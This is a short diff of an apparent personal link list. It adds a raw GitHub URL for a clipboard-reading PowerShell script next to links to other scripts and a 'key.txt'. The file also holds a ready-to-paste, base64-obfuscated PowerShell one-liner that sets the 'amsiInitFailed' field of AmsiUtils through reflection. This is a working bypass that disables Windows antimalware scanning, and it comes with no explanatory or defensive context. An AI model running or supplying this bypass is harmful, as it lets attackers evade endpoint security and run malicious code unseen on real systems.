@@ -2,6 +2,8 @@ https://raw.githubusercontent.com/lazywinadmin/PowerShell/refs/heads/master/TOOL
 
 https://raw.githubusercontent.com/vinicius-batistella/Rumo/refs/heads/main/key.txt
 
+https://raw.githubusercontent.com/gangstanthony/PowerShell/refs/heads/master/Get-Clipboard.ps1
+
 ==============================================================================================================================
 
 [Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
